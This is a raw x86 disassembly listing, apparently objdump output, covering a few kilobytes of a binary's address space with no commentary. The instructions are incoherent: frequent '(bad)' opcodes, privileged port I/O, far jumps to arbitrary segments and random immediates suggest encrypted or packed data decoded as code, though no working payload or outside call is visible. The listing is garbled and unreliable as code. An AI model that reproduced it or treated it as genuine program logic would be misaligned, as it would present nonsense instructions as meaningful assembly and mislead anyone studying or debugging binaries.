  40b6aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6ab:	je     0x40b668
  40b6ad:	cmc    
  40b6ae:	in     al,dx
  40b6af:	imul   ecx,DWORD PTR [esi],0x23633cb2
  40b6b5:	ss retf 
  40b6b7:	je     0x40b694
  40b6b9:	sbb    DWORD PTR [edi+eiz*2],esp
  40b6bc:	cmp    cl,cl
  40b6be:	or     BYTE PTR [esi-0x5d71ad20],0xc5
  40b6c5:	repz and BYTE PTR [esi+0x2c],al
  40b6c9:	mov    dh,0x7e
  40b6cb:	xchg   ecx,eax
  40b6cc:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b6ce:	(bad)  
  40b6cf:	pushf  
  40b6d0:	mov    al,ds:0x193d3457
  40b6d5:	neg    DWORD PTR [ebx-0x62]
  40b6d8:	mov    ebp,0xce0ee59c
  40b6dd:	xor    al,0x4c
  40b6df:	push   edi
  40b6e0:	sbb    bh,bh
  40b6e2:	and    bh,BYTE PTR [ebp-0x4c9ce82b]
  40b6e8:	ficomp WORD PTR [eiz*4-0xc42dad1]
  40b6ef:	(bad)  
  40b6f0:	psrlw  mm5,mm1
  40b6f3:	js     0x40b6a2
  40b6f5:	inc    edi
  40b6f6:	cmc    
  40b6f7:	rcl    DWORD PTR ds:0x44fd6045,cl
  40b6fd:	add    esi,esp
  40b6ff:	jp     0x40b6a0
  40b701:	mov    esp,0x6bc2e16c
  40b706:	js     0x40b69d
  40b708:	jmp    FWORD PTR [esi]
  40b70a:	jnp    0x40b697
  40b70c:	hlt    
  40b70d:	pop    ds
  40b70e:	pop    ds
  40b70f:	adc    cl,BYTE PTR ds:0x31e0573f
  40b715:	imul   eax,ecx,0xffffffc6
  40b718:	shl    bh,0x12
  40b71b:	xor    eax,0x8bab5c5f
  40b720:	jae    0x40b753
  40b722:	sar    DWORD PTR ds:0x55c1bcbb,1
  40b728:	xchg   DWORD PTR [esi+0x79cb8e47],ecx
  40b72e:	and    al,0x84
  40b730:	scas   eax,DWORD PTR es:[edi]
  40b731:	dec    ecx
  40b732:	rcl    ecx,1
  40b734:	pop    edx
  40b735:	cmc    
  40b736:	rcr    al,0x6d
  40b739:	adc    eax,0x38f8de2
  40b73e:	jbe    0x40b781
  40b740:	repnz pop ecx
  40b742:	cmc    
  40b743:	scas   al,BYTE PTR es:[edi]
  40b744:	mov    esi,0xd234d2a6
  40b749:	dec    edx
  40b74a:	pop    esi
  40b74b:	shl    esi,1
  40b74d:	fcomi  st,st(6)
  40b74f:	mov    ebx,0xfa39486e
  40b754:	adc    cl,BYTE PTR [ebx+0x4ea5726b]
  40b75a:	pop    ds
  40b75b:	sbb    eax,0x7ede362
  40b760:	test   al,al
  40b762:	pusha  
  40b763:	jg     0x40b719
  40b765:	std    
  40b766:	push   ebx
  40b767:	inc    edx
  40b768:	retf   
  40b769:	jae    0x40b774
  40b76b:	mov    dl,0x4b
  40b76d:	sub    eax,0xdb14a93c
  40b772:	and    BYTE PTR [eax+0x69],bh
  40b775:	mov    WORD PTR [esi],ds
  40b777:	xchg   ebx,eax
  40b778:	sub    al,0x9e
  40b77a:	mov    cl,0x38
  40b77c:	pop    ds
  40b77d:	fdivr  QWORD PTR [esi]
  40b77f:	leave  
  40b780:	(bad)  
  40b781:	mov    bh,0x2b
  40b783:	fdivr  QWORD PTR [edi-0x15]
  40b786:	cdq    
  40b787:	and    bh,BYTE PTR [eax]
  40b789:	push   cs
  40b78a:	adc    al,0xa5
  40b78c:	push   ds
  40b78d:	cmp    DWORD PTR [eax-0x487c2089],ebx
  40b793:	sbb    DWORD PTR [edx+ecx*8-0x5944822f],0xffffffd4
  40b79b:	lods   al,BYTE PTR ds:[esi]
  40b79c:	test   ebx,esp
  40b79e:	xchg   ebx,eax
  40b79f:	sbb    al,0x66
  40b7a1:	inc    ebx
  40b7a2:	lods   al,BYTE PTR ds:[esi]
  40b7a3:	out    0xd8,al
  40b7a5:	sbb    DWORD PTR [ebx],ebx
  40b7a7:	mov    al,0xf
  40b7a9:	jnp    0x40b78f
  40b7ab:	lahf   
  40b7ac:	in     eax,0x77
  40b7ae:	push   edx
  40b7af:	dec    ebx
  40b7b0:	imul   ebx,DWORD PTR [edi+ebx*8],0xa2fad467
  40b7b7:	jl     0x40b7b1
  40b7b9:	pop    edi
  40b7ba:	lods   al,BYTE PTR ds:[esi]
  40b7bb:	retf   
  40b7bc:	test   al,0xd4
  40b7be:	mov    eax,0x5c945db9
  40b7c3:	loop   0x40b792
  40b7c5:	add    BYTE PTR [edx+edx*4+0x4de6b531],bl
  40b7cc:	sub    bh,BYTE PTR [ebx+edx*8]
  40b7cf:	pop    esp
  40b7d0:	add    esi,DWORD PTR [ebp+0x2877f89e]
  40b7d6:	test   BYTE PTR [esi],bh
  40b7d8:	retfw  
  40b7da:	sub    esp,DWORD PTR [eax-0xc5166ed]
  40b7e0:	jne    0x40b859
  40b7e2:	add    cl,ch
  40b7e4:	mov    ebp,0xca06be29
  40b7e9:	in     eax,dx
  40b7ea:	ret    0xb638
  40b7ed:	push   es
  40b7ee:	addr16 xchg esp,eax
  40b7f0:	std    
  40b7f1:	aam    0x59
  40b7f3:	mov    ds:0x686f552c,eax
  40b7f8:	ds aad 0x31
  40b7fb:	retf   
  40b7fc:	nop
  40b7fd:	inc    eax
  40b7fe:	sahf   
  40b7ff:	adc    ch,cl
  40b801:	pop    eax
  40b802:	mov    dh,0xd9
  40b804:	pop    ds
  40b805:	push   ebx
  40b806:	stos   BYTE PTR es:[edi],al
  40b807:	jmp    0xe41c:0x10f25ca9
  40b80e:	call   0xa0eabaa5
  40b813:	enter  0x55ed,0xca
  40b817:	add    eax,0xac341c3b
  40b81c:	mov    al,0x16
  40b81e:	push   ss
  40b81f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b820:	jmp    0x40b7e7
  40b822:	adc    DWORD PTR [edi],esp
  40b824:	(bad)  
  40b825:	sti    
  40b826:	mov    ah,0x57
  40b828:	repnz cs xchg esp,eax
  40b82b:	jl     0x40b821
  40b82d:	lods   al,BYTE PTR ds:[esi]
  40b82e:	jno    0x40b80e
  40b830:	mov    eax,ds:0x112e6b81
  40b835:	aam    0x2d
  40b837:	push   edi
  40b838:	push   ebx
  40b839:	rol    DWORD PTR [edi],1
  40b83b:	imul   ecx,ecx,0x49
  40b83e:	and    DWORD PTR [ebx],esi
  40b840:	add    BYTE PTR [edx-0x5d],al
  40b843:	mov    ss,WORD PTR [eax]
  40b845:	fwait
  40b846:	mov    DWORD PTR [ebp-0x67],edx
  40b849:	dec    eax
  40b84a:	and    eax,0x189dd4d3
  40b84f:	xor    al,0xf4
  40b851:	adc    ch,BYTE PTR [eax+0x5b]
  40b854:	xor    al,0x78
  40b856:	call   0x6da4a8e3
  40b85b:	jns    0x40b7e8
  40b85d:	xor    bh,BYTE PTR [eax-0x204af122]
  40b863:	(bad)  
  40b865:	imul   edx,esp,0x47ba79d8
  40b86b:	retf   0x138
  40b86e:	pusha  
  40b86f:	add    DWORD PTR ds:0xdc4ef905,edx
  40b875:	je     0x40b81e
  40b877:	sub    DWORD PTR [esi+edx*2-0x1357157c],esi
  40b87e:	in     eax,0x23
  40b880:	cli    
  40b881:	js     0x40b874
  40b883:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b884:	inc    eax
  40b885:	aad    0xa8
  40b887:	sbb    ebx,DWORD PTR [ebp-0x35]
  40b88a:	xor    edx,DWORD PTR [esi]
  40b88c:	pushf  
  40b88d:	aad    0x3a
  40b88f:	stc    
  40b890:	xchg   ebp,eax
  40b891:	fcomp  QWORD PTR [edx-0x6e93ffbc]
  40b897:	dec    ecx
  40b898:	cmp    ah,dl
  40b89a:	xor    al,0x1e
  40b89c:	retf   0x4e9b
  40b89f:	jae    0x40b8eb
  40b8a1:	or     DWORD PTR [edx],ebp
  40b8a3:	aaa    
  40b8a4:	xor    al,0x83
  40b8a6:	jmp    0x600b5f14
  40b8ab:	mov    esp,0x2bcfc875
  40b8b0:	test   al,0xf0
  40b8b2:	sbb    eax,0xa643fbbd
  40b8b7:	(bad)  
  40b8b8:	ss dec edx
  40b8ba:	ret    0x8031
  40b8bd:	push   esi
  40b8be:	push   ebp
  40b8bf:	lea    edi,[ebp+0x3baa11c2]
  40b8c5:	fisttp QWORD PTR [eax-0x59]
  40b8c8:	lock sbb eax,DWORD PTR [edi-0x78f293c2]
  40b8cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8d0:	shr    DWORD PTR [eax+0x3d7d22cf],1
  40b8d6:	popa   
  40b8d7:	and    al,0xe8
  40b8d9:	aad    0x58
  40b8db:	and    ch,BYTE PTR [edx-0x756ab189]
  40b8e1:	test   ebp,edx
  40b8e3:	sbb    BYTE PTR [ecx+eax*2],bl
  40b8e6:	and    eax,0xd0aee368
  40b8eb:	push   ss
  40b8ec:	pusha  
  40b8ed:	retf   0x1322
  40b8f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8f1:	pop    ebp
  40b8f2:	icebp  
  40b8f3:	or     eax,0xb510545e
  40b8f8:	es push ds
  40b8fa:	inc    eax
  40b8fb:	std    
  40b8fc:	lock adc eax,0x212f484
  40b902:	cmp    BYTE PTR [edi+edx*4-0x16],dl
  40b906:	test   al,0x2b
  40b908:	mov    ebx,0xf5712ca8
  40b90d:	cs cwde 
  40b90f:	ret    
  40b910:	nop
  40b911:	arpl   WORD PTR [eax+0x2e3f0c82],bx
  40b917:	mul    BYTE PTR [ebx+ebp*4-0x2191a013]
  40b91e:	out    0xaa,al
  40b920:	das    
  40b921:	(bad)  
  40b922:	stc    
  40b923:	(bad)  
  40b924:	and    bl,BYTE PTR [ecx+0x6641e3b2]
  40b92a:	cwde   
  40b92b:	(bad)  
  40b92c:	scas   al,BYTE PTR es:[edi]
  40b92d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b92e:	jmp    0x40b98f
  40b930:	fstp   QWORD PTR [esi-0x69]
  40b933:	mov    ds:0xbfbc821e,eax
  40b938:	push   ecx
  40b939:	pop    ebx
  40b93a:	dec    ebp
  40b93b:	push   esp
  40b93c:	jae    0x40b998
  40b93e:	pop    ebx
  40b93f:	mov    edx,0x95e150c9
  40b944:	out    0xd7,al
  40b946:	jge    0x40b970
  40b948:	fcomp  DWORD PTR [edx+eax*4+0x12b994a]
  40b94f:	lock dec ebp
  40b951:	sar    BYTE PTR [eax],cl
  40b953:	cwde   
  40b954:	in     al,dx
  40b955:	adc    bl,BYTE PTR [edx]
  40b957:	fsub   st(4),st
  40b959:	shl    BYTE PTR [ebx+ecx*4-0x8],cl
  40b95d:	mov    esp,0x2f155ecd
  40b962:	ins    DWORD PTR es:[edi],dx
  40b963:	lods   al,BYTE PTR ds:[esi]
  40b964:	add    esp,DWORD PTR gs:[eax]
  40b967:	aam    0x96
  40b969:	or     eax,ebx
  40b96b:	dec    edx
  40b96c:	cli    
  40b96d:	dec    ecx
  40b96e:	add    al,0xe4
  40b970:	fidiv  DWORD PTR ds:0x28696302
  40b976:	xchg   DWORD PTR ds:0x4eb7f4d,esp
  40b97c:	push   ds
  40b97d:	call   DWORD PTR [edx]
  40b97f:	outs   dx,DWORD PTR ds:[esi]
  40b980:	cmovle ecx,DWORD PTR [edx]
  40b983:	mov    edi,0x60d2d98c
  40b988:	push   esp
  40b989:	xor    al,0xe7
  40b98b:	or     eax,DWORD PTR [edx-0x1f44ffc8]
  40b991:	pop    esi
  40b992:	sub    ebp,esi
  40b994:	pop    edx
  40b995:	fiadd  DWORD PTR [edx+0x70c9e1f6]
  40b99b:	sbb    edx,DWORD PTR [esp+edx*2]
  40b99e:	ins    BYTE PTR es:[edi],dx
  40b99f:	shl    edx,1
  40b9a1:	ins    DWORD PTR es:[edi],dx
  40b9a2:	push   esp
  40b9a3:	cmp    ah,BYTE PTR [eax+0x3a237187]
  40b9a9:	popa   
  40b9aa:	pushw  ss
  40b9ac:	mov    edx,0x90d0cb4c
  40b9b1:	dec    esp
  40b9b2:	aam    0x28
  40b9b4:	add    eax,0x3f9eda2b
  40b9b9:	inc    eax
  40b9ba:	cmc    
  40b9bb:	mov    ebx,0x19ea9d9d
  40b9c0:	enter  0xbab5,0xac
  40b9c4:	sbb    esi,esp
  40b9c6:	pop    es
  40b9c7:	fdivr  DWORD PTR [edx-0x28]
  40b9ca:	cli    
  40b9cb:	xchg   esp,eax
  40b9cc:	rcl    BYTE PTR [ebp+0x7c2b117e],cl
  40b9d2:	push   eax
  40b9d3:	add    BYTE PTR [ebp+0x55],ah
  40b9d6:	adc    al,BYTE PTR [ecx-0x3e299d3]
  40b9dc:	add    esi,DWORD PTR [ebx]
  40b9de:	stc    
  40b9df:	sub    ecx,DWORD PTR ds:[eax-0xad9742c]
  40b9e6:	xor    DWORD PTR [ecx],edi
  40b9e8:	mov    esi,0x2f3573e4
  40b9ed:	add    BYTE PTR [ebx-0xa],0x25
  40b9f1:	ja     0x40b99e
  40b9f3:	std    
  40b9f4:	inc    ebp
  40b9f5:	fidiv  DWORD PTR [edx-0x7b6df69]
  40b9fb:	sub    ebx,ecx
  40b9fd:	test   al,0x69
  40b9ff:	bound  ecx,QWORD PTR [edx+0x15]
  40ba02:	rol    DWORD PTR [ebp+0x78],1
  40ba05:	mov    ds:0xeadb69bb,al
  40ba0a:	fidivr WORD PTR [ebx+0x7ad375ee]
  40ba10:	mov    eax,0x60e64146
  40ba15:	(bad)  
  40ba16:	fistp  DWORD PTR [esi+edi*1]
  40ba19:	cld    
  40ba1a:	sar    esi,cl
  40ba1c:	in     al,dx
  40ba1d:	jno    0x40b9c3
  40ba1f:	xchg   ebp,eax
  40ba20:	out    0x2e,eax
  40ba22:	xchg   DWORD PTR [edi],esp
  40ba24:	je     0x40ba87
  40ba26:	xor    al,BYTE PTR [esi+0x68]
  40ba29:	pop    es
  40ba2a:	out    dx,eax
  40ba2b:	mov    WORD PTR [edi+0x23],cs
  40ba2e:	and    esi,0x3b98cdd3
  40ba34:	and    esp,DWORD PTR [edi+eiz*2+0x4a]
  40ba38:	mov    esi,0x69b6d9c
  40ba3d:	stos   DWORD PTR es:[edi],eax
  40ba3e:	(bad)  
  40ba3f:	cmp    eax,0xe10e39de
  40ba44:	adc    al,0xe8
  40ba46:	(bad)  [eax]
  40ba48:	or     edi,esi
  40ba4a:	mov    BYTE PTR [ebx-0x64],cl
  40ba4d:	int    0x4a
  40ba4f:	adc    DWORD PTR [eax+0x4e],edi
  40ba52:	nop
  40ba53:	or     al,0xf6
  40ba55:	jb     0x40b9ea
  40ba57:	inc    edx
  40ba58:	dec    esp
  40ba59:	neg    DWORD PTR [edx-0x315ba5a7]
  40ba5f:	ret    
  40ba60:	das    
  40ba61:	test   BYTE PTR ds:0xd927e249,0x63
  40ba68:	iret   
  40ba69:	jne    0x40ba88
  40ba6b:	push   0x5f
  40ba6d:	neg    ebx
  40ba6f:	ins    BYTE PTR es:[edi],dx
  40ba70:	ds out dx,eax
  40ba72:	sub    DWORD PTR [edi-0x57896a55],edx
  40ba78:	les    esi,FWORD PTR [ebp-0x7b84243f]
  40ba7e:	arpl   WORD PTR [edi+0x771ebe09],cx
  40ba84:	ja     0x40baea
  40ba86:	in     eax,0x16
  40ba88:	cwde   
  40ba89:	in     eax,0x7e
  40ba8b:	xor    dl,BYTE PTR [ebx]
  40ba8d:	mov    ebp,0xc97dee93
  40ba92:	fstp   QWORD PTR [eax]
  40ba94:	mov    ss:0x5eed99ad,eax
  40ba9a:	mov    eax,ds:0x5abc91dc
  40ba9f:	jle    0x40ba29
  40baa1:	sbb    eax,0x8fa42e5a
  40baa6:	leave  
  40baa7:	jmp    0x84648e79
  40baac:	arpl   WORD PTR [ebp+0x2d],si
  40baaf:	fsub   QWORD PTR [eax-0x5962d0f4]
  40bab5:	mov    al,ds:0x831f8e73
  40baba:	mov    esp,0x2c141ced
  40babf:	jle    0x40bb36
  40bac1:	ficom  WORD PTR [ebx+0x47]
  40bac4:	push   ebp
  40bac5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bac6:	idiv   BYTE PTR [esp+ebx*1]
  40bac9:	jb     0x40bb32
  40bacb:	lods   eax,DWORD PTR ds:[esi]
  40bacc:	push   esp
  40bacd:	rol    DWORD PTR [edx],1
  40bacf:	jmp    0x40bae9
  40bad1:	cmp    bh,bh
  40bad3:	xor    al,0x2d
  40bad5:	call   0xc406:0xca41ae98
  40badc:	es mov ah,0x9c
  40badf:	iret   
  40bae0:	jb     0x40bade
  40bae2:	arpl   WORD PTR [edx+0x2],bx
  40bae5:	pop    edi
  40bae6:	jno    0x40bb1a
  40bae8:	jmp    0xea77f78c
  40baed:	jecxz  0x40ba83
  40baef:	and    al,0x52
  40baf1:	fwait
  40baf2:	push   ds
  40baf3:	lahf   
  40baf4:	in     al,dx
  40baf5:	inc    edx
  40baf6:	push   ss
  40baf7:	pushf  
  40baf8:	pushf  
  40baf9:	enter  0x748e,0xc8
  40bafd:	fild   QWORD PTR [si-0x2cf4]
  40bb02:	retf   
  40bb03:	inc    esp
  40bb04:	adc    eax,0x8860a9d5
  40bb09:	in     eax,0x41
  40bb0b:	cli    
  40bb0c:	dec    eax
  40bb0d:	repz xor al,bh
  40bb10:	sub    al,0x81
  40bb12:	arpl   sp,di
  40bb14:	xor    BYTE PTR [eax+0x68],al
  40bb17:	xchg   DWORD PTR [ebp-0x43a4795d],edx
  40bb1d:	hlt    
  40bb1e:	xor    BYTE PTR [eax+ebx*8+0xb],al
  40bb22:	es dec edx
  40bb24:	xor    eax,0x38c8929b
  40bb29:	pusha  
  40bb2a:	bound  ebx,QWORD PTR [eax-0x6b]
  40bb2d:	adc    BYTE PTR [eax-0x292d1fc6],bl
  40bb33:	cmp    al,0x6a
  40bb35:	push   ecx
  40bb36:	or     eax,0xc8d99381
  40bb3b:	cs in  eax,0xe2
  40bb3e:	ret    
  40bb3f:	(bad)  
  40bb40:	mov    esp,0x7da1a3af
  40bb45:	hlt    
  40bb46:	sub    BYTE PTR [ecx],dh
  40bb48:	stos   DWORD PTR es:[edi],eax
  40bb49:	inc    ebp
  40bb4a:	imul   edx,DWORD PTR [ebx+0x4a2262e0],0x485423f
  40bb54:	mov    bh,0x74
  40bb56:	sub    DWORD PTR [ebp-0xe401161],ecx
  40bb5c:	xor    DWORD PTR [ebx-0x21bd9c0c],esi
  40bb62:	xor    eax,DWORD PTR [esi]
  40bb64:	mov    ecx,0x3d318aa3
  40bb69:	jbe    0x40bb66
  40bb6b:	pop    ebp
  40bb6c:	xor    BYTE PTR [esi-0x9a28a09],al
  40bb72:	(bad)  
  40bb73:	xor    DWORD PTR [ecx],0x35eed354
  40bb79:	adc    DWORD PTR [edx+0x5b],edi
  40bb7c:	pop    eax
  40bb7d:	mov    al,0x4f
  40bb7f:	in     al,0x6b
  40bb81:	jno    0x40bbc2
  40bb83:	mov    ebp,0x7ca8080e
  40bb88:	mov    ah,0x11
  40bb8a:	jle    0x40bb6b
  40bb8c:	xchg   ecx,eax
  40bb8d:	jge    0x40bb37
  40bb8f:	shl    DWORD PTR [edx],cl
  40bb91:	pop    es
  40bb92:	mov    ?,edi
  40bb94:	in     al,0x4a
  40bb96:	add    al,0x2e
  40bb98:	cld    
  40bb99:	je     0x40bbde
  40bb9b:	adc    DWORD PTR [esi-0x18],0x80889d5c
  40bba2:	mov    eax,0x23873036
  40bba7:	cwde   
  40bba8:	es clc 
  40bbaa:	and    ah,cl
  40bbac:	cdq    
  40bbad:	scas   al,BYTE PTR es:[edi]
  40bbae:	sbb    ebx,ecx
  40bbb0:	fild   DWORD PTR [ebp-0x64a36d68]
  40bbb6:	xor    BYTE PTR [eax],dl
  40bbb8:	loop   0x40bb54
  40bbba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bbbb:	jmp    0xb8b931e6
  40bbc0:	sub    ch,BYTE PTR [ebx-0x3]
  40bbc3:	cmp    eax,0xf0e38d5
  40bbc8:	mov    ebx,0xf429ae37
  40bbcd:	dec    edi
  40bbce:	sub    BYTE PTR [ecx],0xe7
  40bbd1:	mov    bl,0xb4
  40bbd3:	adc    eax,0x13106eae
  40bbd8:	ins    DWORD PTR es:[edi],dx
  40bbd9:	outs   dx,BYTE PTR ds:[esi]
  40bbda:	adc    ecx,DWORD PTR [eax+0x24]
  40bbdd:	inc    eax
  40bbde:	(bad)  [edx+ecx*8+0x2ccd7731]
  40bbe5:	jecxz  0x40bc0a
  40bbe7:	jne    0x40bb8a
  40bbe9:	adc    edx,DWORD PTR [esi-0x340b4b94]
  40bbef:	xor    dl,dh
  40bbf1:	loopne 0x40bc4f
  40bbf3:	jg     0x40bbc5
  40bbf5:	pop    es
  40bbf6:	cmp    eax,0x3b6b9629
  40bbfb:	push   esi
  40bbfc:	cdq    
  40bbfd:	je     0x40bc7b
  40bbff:	xlat   BYTE PTR ds:[ebx]
  40bc00:	or     eax,0x89aa7815
  40bc05:	mov    bh,0x93
  40bc07:	inc    edx
  40bc09:	dec    ecx
  40bc0a:	or     BYTE PTR [esi-0xac03fd],al
  40bc10:	test   eax,0x1e0d451a
  40bc15:	xchg   edi,eax
  40bc17:	loope  0x40bc6a
  40bc19:	in     eax,dx
  40bc1a:	mov    bl,BYTE PTR [ebx-0x1c2dc218]
  40bc20:	inc    esp
  40bc21:	popa   
  40bc22:	mul    DWORD PTR [edi-0x39056429]
  40bc28:	dec    esp
  40bc29:	inc    ecx
  40bc2a:	mov    esi,gs
  40bc2c:	(bad)  
  40bc2d:	shr    BYTE PTR [ecx],0x40
  40bc30:	dec    eax
  40bc31:	(bad)  
  40bc32:	push   esp
  40bc33:	imul   ebx,DWORD PTR [edx-0xcf138c4],0x70
  40bc3a:	in     al,0x42
  40bc3c:	xchg   esi,eax
  40bc3d:	adc    eax,0xc517f94a
  40bc42:	jno    0x40bc03
  40bc44:	jnp    0x40bc5c
  40bc46:	or     ecx,DWORD PTR [ecx-0x1c]
  40bc49:	mov    WORD PTR [esi-0x4977189f],fs
  40bc4f:	pop    ebx
  40bc50:	mov    dh,0xd
  40bc52:	ja     0x40bc00
  40bc54:	or     eax,0x5878d995
  40bc59:	(bad)  
  40bc5a:	dec    ecx
  40bc5b:	dec    ebx
  40bc5c:	cmp    eax,0xca499625
  40bc61:	in     al,dx
  40bc62:	and    bh,BYTE PTR [edx+0x41]
  40bc65:	leave  
  40bc66:	sbb    BYTE PTR [esp+edi*8-0x2],ah
  40bc6a:	jb     0x40bbec
  40bc6c:	out    0x81,eax
  40bc6e:	and    DWORD PTR ds:0x9f8871f1,edx
  40bc74:	fisub  WORD PTR [esi+eax*8]
  40bc77:	mov    ecx,0x9d869619
  40bc7c:	pusha  
  40bc7d:	adc    esp,DWORD PTR [eax]
  40bc7f:	jmp    0xadda2a2e
  40bc84:	sbb    DWORD PTR [ecx],edx
  40bc86:	fcmovb st,st(4)
  40bc88:	sub    BYTE PTR [edx],dh
  40bc8a:	jae    0x40bc6b
  40bc8c:	dec    ebx
  40bc8d:	int    0xad
  40bc8f:	pop    esi
  40bc90:	jmp    0x5f54:0x594347a6
  40bc97:	push   ebp
  40bc98:	dec    ecx
  40bc99:	pop    ss
  40bc9a:	out    dx,al
  40bc9b:	iret   
  40bc9c:	imul   eax,esp,0x2ae011b1
  40bca2:	inc    ecx
  40bca3:	retf   
  40bca4:	aad    0x80
  40bca6:	in     al,dx
  40bca7:	jge    0x40bc7c
  40bca9:	enter  0xcfa4,0x3b
  40bcad:	aam    0xd0
  40bcaf:	dec    esi
  40bcb0:	cmove  ecx,DWORD PTR [ebx]
  40bcb3:	xchg   edx,eax
  40bcb4:	add    ecx,ebx
  40bcb6:	mov    ah,0x9b
  40bcb8:	out    0x3d,eax
  40bcba:	cmp    eax,0x2985215c
  40bcbf:	xchg   DWORD PTR [eax+0x17],ebp
  40bcc2:	aam    0x7a
  40bcc4:	cmp    al,0x9d
  40bcc6:	mov    bl,0xab
  40bcc8:	pop    edx
  40bcc9:	ret    
  40bcca:	inc    edx
  40bccb:	sahf   
  40bccc:	cld    
  40bccd:	mov    eax,ds:0xa50f36be
  40bcd2:	and    eax,0xc1d90c6c
  40bcd7:	dec    eax
  40bcd8:	push   esp
  40bcd9:	nop
  40bcda:	ds sub eax,0x18da4f28
  40bce0:	jge    0x40bc9f
  40bce2:	and    eax,0xef69ff74
  40bce7:	lods   eax,DWORD PTR ds:[esi]
  40bce8:	adc    esi,DWORD PTR ds:[edi+0x43]
  40bcec:	cmc    
  40bced:	pop    ss
  40bcee:	sbb    al,0x8
  40bcf0:	(bad)  
  40bcf2:	aaa    
  40bcf3:	fs push eax
  40bcf5:	sbb    DWORD PTR [eax-0x3c50ac46],esp
  40bcfb:	mov    edi,esp
  40bcfd:	sub    eax,0x642a7821
  40bd02:	add    edx,ebx
  40bd04:	jl     0x40bcb9
  40bd06:	sbb    BYTE PTR [edi-0x4377caed],dl
  40bd0c:	ja     0x40bd18
  40bd0e:	sub    eax,0xa350186c
  40bd13:	mov    eax,ds:0x542af0ab
  40bd18:	dec    ebx
  40bd19:	imul   edi,esp,0x80a43b52
  40bd1f:	xor    eax,0x565797cf
  40bd24:	rol    BYTE PTR [eax+0x7b],0x60
  40bd28:	sti    
  40bd29:	popf   
  40bd2a:	or     dh,al
  40bd2c:	fs pop esp
  40bd2e:	mul    ah
  40bd30:	cmc    
  40bd31:	xchg   bh,bl
  40bd33:	sbb    DWORD PTR [eax],ebx
  40bd35:	gs cmp ebx,edi
  40bd38:	and    DWORD PTR [ecx],edx
  40bd3a:	adc    DWORD PTR [eax-0x2c],edi
  40bd3d:	cmp    ebx,esp
  40bd3f:	lds    edi,FWORD PTR [eax]
  40bd41:	imul   DWORD PTR [esi+0x64]
  40bd44:	cmp    cl,BYTE PTR [eax-0x55]
  40bd47:	pusha  
  40bd48:	retf   0x1a7b
  40bd4b:	mov    BYTE PTR [eax+0x2c],ch
  40bd4e:	mov    ecx,DWORD PTR [ebp+0x19153be2]
  40bd54:	push   ds
  40bd55:	xor    eax,0xa073ef96
  40bd5a:	xor    DWORD PTR [ecx+eax*8+0x26],eax
  40bd5e:	xor    eax,0x68362a1e
  40bd63:	into   
  40bd64:	dec    esi
  40bd65:	aad    0x2f
  40bd67:	rcl    BYTE PTR [ebx-0x528bc105],1
  40bd6d:	dec    ebx
  40bd6e:	dec    ebp
  40bd6f:	jmp    0x96fa:0xd45099ef
  40bd76:	ret    
  40bd77:	sbb    ebx,DWORD PTR [edi-0x15]
  40bd7a:	push   cs
  40bd7b:	xchg   BYTE PTR [ecx-0x21],bl
  40bd7e:	mov    ebx,DWORD PTR [ebp+0x61868dfd]
  40bd84:	das    
  40bd85:	(bad)  
  40bd87:	cdq    
  40bd88:	pop    ebp
  40bd89:	inc    edx
  40bd8a:	daa    
  40bd8b:	test   DWORD PTR [esp+eiz*8],edi
  40bd8e:	das    
  40bd8f:	adc    edx,DWORD PTR [ebp+0x204a306f]
  40bd95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd96:	jge    0x40bd99
  40bd98:	mov    eax,ds:0x82c2d572
  40bd9d:	int3   
  40bd9e:	add    BYTE PTR [ecx],al
  40bda0:	in     al,0xd7
  40bda2:	mov    ds:0xb27f8fc,eax
  40bda7:	push   ebx
  40bda8:	loope  0x40bddb
  40bdaa:	pop    es
  40bdab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bdac:	stos   DWORD PTR es:[edi],eax
  40bdad:	xchg   esi,eax
  40bdae:	lds    eax,FWORD PTR [eax+0x24e2fd84]
  40bdb4:	test   DWORD PTR [esp+esi*2],ecx
  40bdb7:	mov    bl,0x3d
  40bdb9:	xchg   edx,eax
  40bdba:	mov    cl,0xce
  40bdbc:	sub    al,0xe1
  40bdbe:	and    DWORD PTR [eax+0x38f3051a],ebp
  40bdc4:	rcl    DWORD PTR [ecx],1
  40bdc6:	(bad)  
  40bdc7:	sti    
  40bdc8:	addr16 call 0xcea0:0x597aee61
  40bdd0:	xchg   edi,eax
  40bdd1:	and    DWORD PTR [ebx+0x77],ebx
  40bdd4:	lock mov bl,BYTE PTR [esi]
  40bdd7:	rol    BYTE PTR [esp+ebp*2+0x4c],1
  40bddb:	or     esi,DWORD PTR [ecx-0x7a]
  40bdde:	lods   al,BYTE PTR ds:[esi]
  40bddf:	xor    al,0x6b
  40bde1:	bound  eax,QWORD PTR [ecx-0x40]
  40bde4:	inc    esi
  40bde5:	sub    bl,BYTE PTR [ebp+0x51ed54fd]
  40bdeb:	fimul  DWORD PTR [ecx]
  40bded:	mov    al,0xd8
  40bdef:	loopne 0x40bd8c
  40bdf1:	mov    edi,DWORD PTR [esi]
  40bdf3:	add    BYTE PTR [ecx+esi*2-0x6f],ch
  40bdf7:	test   eax,0xa40de9c7
  40bdfc:	cmp    eax,0x7d7b63dd
  40be01:	cdq    
  40be02:	fisttp QWORD PTR [edx-0x27]
  40be05:	(bad)  
  40be06:	lea    esi,[edx+0x27799f51]
  40be0c:	mov    ecx,0xa64e43ad
  40be11:	call   0xc7bd:0x549e785e
  40be18:	dec    eax
  40be19:	dec    ecx
  40be1a:	data16 stc 
  40be1c:	out    0xbd,eax
  40be1e:	jno    0x40be87
  40be20:	add    DWORD PTR [eax],esp
  40be22:	jge    0x40be4d
  40be24:	mov    ds:0x7dbc4657,al
  40be29:	xor    al,0xe6
  40be2b:	or     esi,edi
  40be2d:	dec    ebp
  40be2e:	cmp    dl,BYTE PTR [ebx]
  40be30:	pop    ss
  40be31:	mov    WORD PTR [ecx+0x136bb0da],ss
  40be37:	push   ss
  40be38:	mov    eax,0x582a305c
  40be3d:	xor    ecx,DWORD PTR [ebx+0x44]
